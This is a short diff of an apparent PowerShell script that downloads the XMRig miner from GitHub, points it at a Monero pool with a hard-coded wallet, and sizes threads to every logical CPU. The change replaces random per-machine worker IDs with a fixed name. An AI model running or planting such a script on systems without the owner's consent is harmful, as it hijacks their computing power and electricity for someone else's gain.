@@ -3,9 +3,7 @@ $pool = "gulf.moneroocean.stream:10001"
 $user = "45MBTQ27xo1LJmAi6sNFTyZhgTdoF45XCRsLUtmL7Lo376nNuxcaSxAa3JUkUV4xHEVSpsEA6nwL5S28g1fCa1RwPfXpwnH"
 $threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors
 
-$guid = [guid]::NewGuid().ToString("N")
-$workerId = $guid.Substring(0, 12)
-$worker = "rig-w-$workerId"
+$worker = "All-In-One"
 
 Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip" -OutFile "xmrig.zip"
 Expand-Archive xmrig.zip
